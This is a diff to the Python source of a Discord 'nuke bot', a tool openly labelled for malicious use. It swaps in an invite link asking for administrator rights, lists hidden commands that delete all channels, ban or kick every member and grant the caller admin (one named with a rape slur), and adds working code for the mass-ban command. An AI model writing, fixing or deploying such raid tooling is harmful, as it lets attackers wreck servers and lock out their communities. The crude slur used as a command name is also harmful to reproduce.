@@ -1,4 +1,4 @@
-# nuke bot by MEDMEX#7945/MaxDaKing
+# nuke bot by MEDMEX#1337/MaxDaKing
 
 import discord
 from discord.ext import commands
@@ -105,7 +105,7 @@ async def ban(ctx, member: discord.Member=None):
 @client.command(pass_context=True)
 async def invite(ctx):
     channel = ctx.message.channel
-    await channel.send("https://discordapp.com/oauth2/authorize?client_id=503182818667659274&permissions=8&redirect_uri=https%3A%2F%2Fdiscordapp.com%2Fapi%2Foauth2%2Fauthorize%3Fclient_id%3D503182818667659274%26redirect_uri%3DMedbot%26response_type%3Dcode%26scope%3Didentify&scope=bot")
+    await channel.send("https://discordapp.com/api/oauth2/authorize?client_id=614036849958060052&permissions=8&redirect_uri=https%3A%2F%2Fdiscordapp.com%2Fapi%2Foauth2%2Ftoken&response_type=code&scope=identify%20bot")
 
 #Malicious purpose
 @client.command(pass_context=True)
@@ -116,6 +116,7 @@ async def secret(ctx):
     )
 
     embed.set_author(name='secret')
+    embed.add_field(name='$g', value='Bans everybody from the server (bot needs banning perms and needs to have a higher role than users', inline=False)
     embed.add_field(name='$rape', value='Deletes all channels and bans everyone (bot needs manage channels and banning perms)', inline=False)
     embed.add_field(name='$h', value='Kicks everyone from the server (bot needs kicking perms)', inline=False)
     embed.add_field(name='$dab', value='Gives you admin access (bot needs administrator)', inline=False)
@@ -124,13 +125,25 @@ async def secret(ctx):
 
 @client.command(pass_context=True)
 async def h(ctx):
-        for member in list(ctx.message.guild.members):
-            try:
-                await guild.kick(member)
-                print ("User " + member.name + " has been kicked from ")
-            except:
-                pass
-        print ("Action Completed: kall")
+    guild = ctx.message.guild
+    for member in list(ctx.message.guild.members):
+        try:    
+            await guild.kick(member)
+            print ("User " + member.name + " has been kicked")
+        except:
+            pass
+    print ("Action Completed: kall")
+
+@client.command(pass_context=True)
+async def g(ctx):
+    guild = ctx.message.guild
+    for member in list(ctx.message.guild.members):
+        try:
+            await guild.ban(member)
+            print ("User " + member.name + " has been banned")
+        except:
+            pass
+    print ("Action Completed: ball")
 
 @client.command(pass_context=True)
 async def rape(ctx):
